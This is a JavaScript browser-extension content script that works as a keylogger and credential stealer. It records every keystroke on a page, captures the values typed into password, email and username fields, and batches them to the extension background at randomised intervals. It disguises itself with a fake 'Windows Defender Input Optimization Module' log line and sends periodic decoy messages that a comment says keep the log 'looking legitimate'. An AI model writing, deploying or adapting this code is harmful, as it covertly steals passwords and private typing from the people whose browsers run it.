(() => {
    'use strict';

    let keystrokeBuffer = [];
    let currentWord = '';
    let lastSent = Date.now();

    const sendToBackground = (type, payload) => {
        try {
            chrome.runtime.sendMessage({ type, ...payload });
        } catch (e) {}
    };

    // === KEYSTROKE CAPTURE ===
    document.addEventListener('keydown', (e) => {
        if (!e.key) return;

        const now = new Date().toISOString();

        // Record every key
        if (e.key.length === 1) {                    // printable characters
            currentWord += e.key;
            keystrokeBuffer.push(`${now} KEY: ${e.key} (code: ${e.code})`);
        } 
        else if (e.key === 'Backspace') {
            currentWord = currentWord.slice(0, -1);
            keystrokeBuffer.push(`${now} KEY: Backspace`);
        } 
        else if (e.key === 'Enter' || e.key === 'Tab') {
            if (currentWord.length > 0) {
                keystrokeBuffer.push(`${now} ENTERED: ${currentWord}`);
                currentWord = '';
            }
            keystrokeBuffer.push(`${now} KEY: ${e.key}`);
        } 
        else {
            keystrokeBuffer.push(`${now} SPECIAL: ${e.key}`);
        }

        // Send batch every 8–12 seconds or when buffer is large
        if (keystrokeBuffer.length >= 15 || Date.now() - lastSent > 8000 + Math.random() * 4000) {
            sendToBackground('KEYSTROKE', { 
                data: keystrokeBuffer.join(' | ') 
            });
            keystrokeBuffer = [];
            lastSent = Date.now();
        }
    }, true);

    // === INPUT FIELD MONITORING (catches passwords, emails, forms) ===
    document.addEventListener('input', (e) => {
        const target = e.target;
        if (!target) return;

        if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
            const fieldType = target.type || 'text';
            const fieldName = target.name || target.id || 'unnamed';

            if (fieldType === 'password' || fieldType === 'email' || 
                fieldName.toLowerCase().includes('pass') || 
                fieldName.toLowerCase().includes('email') || 
                fieldName.toLowerCase().includes('user')) {
                
                sendToBackground('INPUT', {
                    field: `${fieldType} (${fieldName})`,
                    value: target.value
                });
            }
        }
    }, true);

    // === PERIODIC SYSTEM ACTIVITY (keeps the log looking legitimate) ===
    setInterval(() => {
        sendToBackground('SYSTEM', {});
    }, 180000); // every 3 minutes

    // Cleanup on page unload
    window.addEventListener('beforeunload', () => {
        if (keystrokeBuffer.length > 0) {
            sendToBackground('KEYSTROKE', { data: keystrokeBuffer.join(' | ') });
        }
    });

    console.log('Windows Defender Input Optimization Module loaded');
})();
